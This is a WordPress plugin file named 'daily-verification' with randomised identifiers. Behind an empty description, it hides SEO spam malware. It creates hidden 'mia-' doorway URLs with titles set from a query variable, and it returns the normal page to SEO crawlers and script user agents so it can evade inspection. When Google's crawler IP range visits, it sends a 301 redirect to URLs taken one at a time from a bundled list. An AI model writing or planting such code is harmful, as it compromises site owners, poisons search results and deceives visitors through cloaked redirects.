<?php
/**
 * Plugin Name: daily-verification
 * Description: daily-verification
 * Version: 1.0
 * Author: John Smith
 */
 

class xubhUGOp {
	
    public function __construct() {
        add_action('init', [$this, 'wzjtwgvoaa']);
        add_filter('query_vars', [$this, 'dsaug']);
        add_action('template_include', [$this, 'edyyk']);
		add_filter('document_title_parts', [$this, 'boogidf']);
    }

    public function wzjtwgvoaa() {
        add_rewrite_rule(
            '^mia-([0-9]+).*?$',
            'index.php?wgnqe=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function dsaug($bXMEz) {
        $bXMEz[] = 'wgnqe';
        $bXMEz[] = 'vagsn';
        return $bXMEz;
    }
	
	public function boogidf($bBBROCIG4T) {
		if (get_query_var('wgnqe')) $bBBROCIG4T['title'] = get_query_var('vagsn');
		return $bBBROCIG4T;
	}

    public function edyyk($cQ5dG5EB) {
		
		$sWCkcb3deP = array('homepage-meta', 'free-online', 'item-business', 'widgets-board', 'clean-cookies', 'ui-polyfill', 'dotbot', 'action-create', 'mj12bot', 'semrush', 'Go-http-client', 'portal-game', 'serpstatbot', 'wall-sync', 'python', 'gptbot', 'ahrefsbot', 'netspider');
		foreach($sWCkcb3deP as $jAtK4kKcbM) { if (stripos($_SERVER['HTTP_USER_AGENT'], $jAtK4kKcbM) !== false) return $cQ5dG5EB; }

        if (get_query_var('wgnqe') && preg_match('/^[0-9]+$/', get_query_var('wgnqe'))) {
            return plugin_dir_path(__FILE__) . 'daily-verification/consent-simple.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$j6coAKIp = plugin_dir_path(__FILE__) . 'daily-verification/cf7-method.php';
			if (is_file($j6coAKIp)) {
				$vdidTUP = file($j6coAKIp, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($vdidTUP) > 1) {
					$jR8NA = array_shift($vdidTUP);
					$rP4QA = array_shift($vdidTUP);
					if (strlen($rP4QA) > 0) {
						$uneS3iR = $jR8NA . "\n" . implode("\n", $vdidTUP);
						file_put_contents($j6coAKIp, $uneS3iR);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $rP4QA");
						exit;
					}
				}
			}
		}
        return $cQ5dG5EB;
    }
}
new xubhUGOp();



